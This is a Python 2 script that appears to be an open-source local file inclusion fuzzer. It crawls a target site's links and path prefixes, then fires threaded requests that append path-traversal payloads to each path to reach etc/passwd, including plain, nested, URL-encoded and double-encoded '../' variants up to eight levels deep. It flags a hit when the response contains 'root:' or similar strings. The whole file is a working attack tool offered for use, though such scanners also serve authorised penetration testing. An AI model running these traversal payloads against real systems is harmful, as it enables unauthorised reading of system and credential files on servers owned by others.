#MIT License
#Usage: lfi_fuzzer.py url
import urllib2,re,sys
from urlparse import urlparse
from threading import Thread
USER_AGENT='Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36'
DEPTH=1
LFI_DEPTH=8
def Verify(url):
	#print url
	try:
		resp=get(url)
		if re.findall("root:|nobody:|/var",resp):
			print "\n[INFO] - LFI Found on : "+ url
		sys.exit(0)
	except:
		sys.exit(0)
def LFIFuzzer(url,lfi_depth):
	path_formats=["../",'....//','..%2f','%2e%2e/','%2e%2e%2f','..%252f','%252e%252e/','%252e%252e%252f','..%255c','..%5c','%2e%2e\\','%2e%2e%5c']
	#cover more if needed - https://code.google.com/p/fuzzdb/source/browse/trunk/attack-payloads/path-traversal/traversals-8-deep-exotic-encoding.txt
	FUZZ_URLS=[]
	for path in path_formats:
		for d in range(0,lfi_depth):
			FUZZ_URLS.append(url+path+"etc/passwd")
			path+=path
	for x in FUZZ_URLS: 
		t = Thread(target=Verify, args=(x,))
		t.start()
def rreplace(s, old, new, occurrence):
	li = s.rsplit(old, occurrence)
	return new.join(li)
def get(url):
	try:
		req = urllib2.Request(url)
		req.add_header('User-Agent', USER_AGENT)
		resp = urllib2.urlopen(req)
		return unicode(resp.read(), "utf-8",errors="replace")
	except urllib2.HTTPError, error:
		print "\n[ERROR] - HTTP Error: "+ str(error)
		sys.exit(0)
	except urllib2.URLError, error:
		#print "\n[ERROR] - URL Error: "+ str(error)
		sys.exit(0)
def Parse(url):
	try:
		parse_url = urlparse(url)
		base_url= '{uri.scheme}://{uri.netloc}'.format(uri=parse_url)
		html=get(url)
		link_re = re.compile(r'href="(.*?)"')
		allurls=link_re.findall(html)
		allurls =list(set(allurls))
		#print "Extracted URLs" + str(allurls)
		f_urls=[]
		f_urls.append(base_url)
		for ul in allurls:
			tmp_ul=''
			dblslah=False
			if ul.startswith("//"):
				dblslah=True
				if (urlparse(url).hostname) in (urlparse(ul).hostname):
					tmp_ul="http:"+ul
			elif ul.startswith("/") and dblslah==False:
				tmp_ul=base_url+ul
			elif ul.startswith("http"):
				if (urlparse(url).hostname) in (urlparse(ul).hostname):
					tmp_ul=ul
			if tmp_ul not in f_urls:
				f_urls.append(tmp_ul)

		f_urls =list(set(f_urls)) #Valid Unique URLs from Page
		#print "\n\nFormated URLS" + str(f_urls)
		#Extracting Path URLS
		final_urls=[]
		for u in f_urls:
			tmp_dbl_slash=u.replace("://","[X-0-0-X]",1)
			if ("://") not in tmp_dbl_slash: 
				if tmp_dbl_slash.endswith('/'):
					if tmp_dbl_slash not in final_urls:
						final_urls.append(tmp_dbl_slash.replace("[X-0-0-X]","://",1))
					tmp_dbl_slash=rreplace(tmp_dbl_slash,'/','',1)
				sep_count=tmp_dbl_slash.count("/")
				while(sep_count>0):
					x=tmp_dbl_slash.split('/')[-1]
					tmp_dbl_slash=rreplace(tmp_dbl_slash,x,"",1)
					if tmp_dbl_slash not in final_urls:
						final_urls.append(tmp_dbl_slash.replace("[X-0-0-X]","://",1))
					tmp_dbl_slash=tmp_dbl_slash[:-1]
					sep_count-=1
		final_urls=list(set(final_urls))
		return f_urls,final_urls
	except Exception as e:
		print "Error: " + str(e)
def getURLS(url,depth,lfi_depth):
	print "Starting LFI Crawler - http://opensecurity.in" 
	VALIDURLS,PATHURLS=Parse(url)
	if PATHURLS:
		for x in PATHURLS:
			LFIFuzzer(x,lfi_depth)
getURLS(sys.argv[1],DEPTH,LFI_DEPTH)